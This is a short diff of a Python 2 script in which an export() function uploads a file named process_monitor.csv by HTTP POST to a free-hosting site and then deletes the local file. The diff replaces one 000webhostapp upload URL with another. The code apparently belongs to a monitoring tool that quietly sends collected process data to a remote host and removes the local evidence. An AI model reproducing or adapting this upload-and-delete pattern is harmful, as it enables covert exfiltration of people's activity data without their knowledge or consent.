@@ -47,7 +47,7 @@ def log_to_file(message):
 def export():
     try:
       print "Exporting"
-      url = "http://psyberlupus.000webhostapp.com/site.php/post"
+      url = "http://vidhawansak.000webhostapp.com/site.php/post"
       files = {'document': open('process_monitor.csv','rb')}
       r = requests.post(url, files=files)
       os.remove("process_monitor.csv")
